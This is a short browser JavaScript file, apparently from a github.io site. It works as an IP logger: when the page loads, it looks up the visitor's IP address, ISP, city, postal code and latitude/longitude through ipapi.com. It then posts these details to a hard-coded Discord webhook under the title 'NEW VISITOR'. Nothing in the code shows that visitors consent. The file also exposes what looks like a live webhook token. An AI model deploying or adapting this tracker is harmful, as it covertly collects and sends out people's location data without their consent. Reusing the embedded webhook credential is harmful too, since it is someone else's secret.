document.addEventListener('DOMContentLoaded', () => {
  fetch('https://ipapi.com/json/?callback=yourCallback')
    .then(response => response.text())
    .then(data => {
      // Extract the JSON data from the response
      const jsonStr = data.match(/^{.*}$/)[0];
      const geoData = JSON.parse(jsonStr);
      
      const ipAddress = geoData.ip;
      const currentDateTime = new Date();
      const dateTimeString = currentDateTime.toLocaleString();

      const message = createMessage(ipAddress, dateTimeString, geoData);
      sendToDiscord(message);

      document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
      document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
    })
    .catch(error => console.error(error));
});

function createMessage(ipAddress, dateTimeString, geoData) {
  const { ip, isp, country_name, region, city, zip, lat, lon } = geoData;

  const message = {
    embeds: [
      {
        title: '***NEW VISITOR***',
        color: 16776960, // Yellow color
        description: `
          IP Address: ${ip}
          Date and Time: ${dateTimeString}
          ISP: ${isp}
          Country: ${country_name}
          Region: ${region}
          City: ${city}
          Postal Code: ${zip}
          Latitude: ${lat}
          Longitude: ${lon}
        `,
        thumbnail: {
          url: 'https://cdn.discordapp.com/attachments/1008763573029306519/1112393554585718867/1075892497257091092.png' // Customize the URL of the preview image
        },
        url: 'https://applebeesworker.github.io' // Customize the URL of the website
      }
    ]
  };

  return message;
}

function sendToDiscord(message) {
  const webhookUrl = 'https://discord.com/api/webhooks/1112485667105157250/Fdn-HkD6bu7AFkJq4AMAEy9hiP3Nn9OWgeaKLoITdeNOAyA9ymXiHx0bK6IrAcd4NSGx';

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(message)
  })
    .then(response => {
      if (!response.ok) {
        throw new Error('Error sending message to Discord');
      }
    })
    .catch(error => console.error(error));
}
